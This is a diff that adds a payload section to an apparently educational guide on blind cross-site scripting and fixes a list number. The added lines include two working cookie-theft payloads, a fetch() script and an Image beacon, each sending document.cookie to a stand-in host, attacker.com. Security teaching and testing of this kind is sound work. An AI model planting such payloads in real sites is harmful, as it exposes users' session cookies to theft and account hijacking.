@@ -25,7 +25,7 @@ Blind XSS is a type of Cross-Site Scripting (XSS) attack where the attacker's pa
    - Admin panels often review user-submitted data (e.g., support tickets, logs).
 2. **Log Files**  
    - Web servers store logs that may include malicious input.
-1. **User Profiles**  
+3. **User Profiles**  
    - Some systems allow HTML/JS in profile fields that admins review.
 4. **Feedback Forms**  
    - Attackers submit malicious scripts that execute when reviewed.
@@ -36,3 +36,17 @@ Blind XSS is a type of Cross-Site Scripting (XSS) attack where the attacker's pa
 ### **(1) Crafting Payloads**
 Since feedback is delayed, attackers use callback mechanisms:
 ```html
+<script>
+  fetch('https://attacker.com/steal?data=' + document.cookie);
+</script>
+```
+Or use services like:
+- **[XSS Hunter](https://xsshunter.com/)** – Automates blind XSS detection.
+- **[Interact.sh](https://interact.sh/)** – Checks for out-of-band interactions.
+
+### **(2) Testing with Delayed Callbacks**
+Instead of `alert()`, use:
+```javascript
+new Image().src="http://attacker.com/log?data="+encodeURIComponent(document.cookie);
+```
+
